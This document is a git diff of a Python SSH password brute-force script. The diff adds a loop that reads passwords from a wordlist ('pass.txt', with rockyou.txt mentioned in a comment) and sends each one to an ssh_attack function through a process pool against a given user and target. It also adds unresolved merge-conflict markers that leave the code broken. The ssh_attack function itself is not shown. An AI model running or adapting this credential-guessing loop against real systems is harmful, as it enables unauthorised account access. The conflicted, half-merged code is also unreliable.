@@ -75,6 +75,7 @@ if __name__ == '__main__':
     queue = manager.Queue() #This is needed to retrieve the final password
     event = manager.Event() #This is needed to stop the processing when password is found
     t1 = time.time()
+<<<<<<< HEAD
     queue.put(0)
     #creating a lock for debugging purpose
     lock = Lock()
@@ -94,6 +95,30 @@ if __name__ == '__main__':
 #    print("The password is " + queue.get())
 #    print('Code executed in: '+ str(time.time() - t1))
 #    exit(0)
+=======
+
+    '''For Asynchronous'''
+    #with open('rockyou.txt','r',10000) as f:
+    i=0
+    with open('pass.txt','r') as f:
+        for x in f:
+            x = x.strip()
+            worker = pool.apply_async(ssh_attack, args=(options.user, options.target, x, event,queue,i))
+            if x.strip() == "" : continue
+
+    print("The password is " + queue.get())
+    print('Code executed in: '+ str(time.time() - t1))
+    exit(0)
+#
+#Also check here for implementation of multiproc with feeding proc on the fly 
+#https://github.com/averagesecurityguy/scripts/blob/master/bruteforce/brute_http_basic.py
+
+##############################3
+##Working with process
+#    for password in pass_list:
+#       p = mp.Process(target=ssh_attack, args=(options.user, options.target, password, event,array,q))
+#       p.start()
+>>>>>>> 9ce8074e0f442b123f0a7b20511c3168e1abe2f8
 #
 ##############################3
 #Working with process
